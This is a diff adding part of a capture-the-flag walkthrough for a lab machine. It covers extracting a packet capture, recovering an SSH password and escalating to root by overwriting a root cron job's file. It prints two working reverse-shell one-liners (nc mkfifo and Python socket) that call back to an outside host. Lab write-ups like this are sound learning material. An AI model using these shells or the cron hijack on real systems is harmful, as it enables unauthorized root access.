@@ -99,3 +99,76 @@ Change the port based on what port you have entered on the Php reverse shell fil
 ---  
 
 After getting initial foothold on the system, your first instinct should be to find any suspicious files and directories
+
+If you also enumerated properly, you would see a **"/incidents"** folder.  
+Inside the folder you would see a .pcapng file, extract the file and use **Wireshark** on it.
+
+```
+python3 -m http.server 9999
+```
+
+Running the command above will start a Python http server and it will host the contents of the directory on the server.  
+On your Kali Linux box, run the command below:
+
+```
+wget http://10.10.x.x:9999/suspicious.pcapng
+```
+
+Combining both of these commands, you first start a server then use the wget tool from your Kali Linux box to extract the .pcapng file.
+
+## Wireshark Packet Analysis
+
+After extracting the .pcapng file, run the command below:
+
+```
+wireshark suspicious.pcapng
+```
+
+Running the command will open the .pcapng file and it's up to you to analyze it.  
+If you follow the TCP stream, you would see a password hidden there. Extract the password then login to SSH.
+
+## SSH Login and Privilege Escalation
+
+Using the credentials obtained from the packet file, login to SSH and extract the user.txt flag.
+
+Assuming you have linpeas and pspy64 on your Kali Linux box, run the commands below on the directory to where the two tools are installed:
+
+```
+python3 -m http.server 9999
+```
+
+Use the wget on the target box to extract one or both tools.
+
+```
+wget http://10.10.x.x:9999/linpeas.sh
+```
+
+and
+
+```
+wget http://10.10.x.x/pspy
+```
+
+After getting the tools, add execute permissions to one or both files and execute it.
+
+---
+
+Most of the scan results are not that helpful except the ones from pspy64.  
+Pspy64 will reveal cron jobs that are running on the box, if you analyze it carefully, you would see that root is executing a file per second/minute.
+
+Go to the file location then modify the contents of that file to a one liner reverse shell.
+
+You can choose from the two or use your own one liner reverse shell.
+
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Save the contents of the file then set up a listener on your Kali Linux box then wait for the cron job to execute the file.
+
+After a few seconds or minutes you should have a root reverse shell, if you do get a shell go to the **"/root"** directory the extract the root flag
